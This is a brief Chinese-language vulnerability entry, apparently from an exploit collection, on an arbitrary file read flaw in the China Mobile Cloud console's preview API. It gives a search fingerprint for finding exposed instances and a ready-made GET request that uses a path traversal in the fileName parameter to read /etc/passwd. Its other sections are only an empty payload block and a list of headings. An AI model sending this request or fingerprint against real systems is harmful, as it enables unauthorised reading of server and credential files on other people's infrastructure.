# 中国移动云控制台preview存在任意文件读取

- **系统**：中国移动云控制台　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="op-login-static/favicon.ico"`
- **请求**：`GET /api/query/helpcenter/api/v2/preview?fileName=../../../../../../../../etc/passwd HTTP/1.1`

**请求体 / payload**
```

```

**其他**
- 中国移动云控制台preview存在任意文件读取: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 中国移动云控制台